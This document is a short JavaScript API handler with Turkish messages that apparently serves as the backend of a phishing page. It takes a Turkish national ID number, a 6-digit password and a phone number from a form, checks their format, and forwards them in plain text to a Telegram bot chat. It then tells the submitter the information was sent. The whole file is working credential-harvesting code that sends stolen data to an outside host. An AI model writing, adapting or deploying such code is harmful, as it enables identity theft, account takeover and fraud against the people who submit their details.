import axios from 'axios';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Yalnızca POST istekleri desteklenir.' });
  }

  try {
    const { tc, password, phone } = req.body;
    if (!tc || tc.length !== 11 || !/^\d+$/.test(tc)) {
      throw new Error('Geçersiz TC numarası.');
    }
    if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
      throw new Error('Geçersiz şifre.');
    }
    if (!phone || phone.length !== 10 || !/^\d+$/.test(phone)) {
      throw new Error('Geçersiz telefon numarası.');
    }

    const message = `TC: ${tc}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;
    const response = await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: process.env.TELEGRAM_CHAT_ID, text: message }
    );
    res.status(200).json({ message: 'Bilgiler gönderildi.' });
  } catch (error) {
    res.status(500).json({ message: 'Hata oluştu.', details: error.message });
  }
}
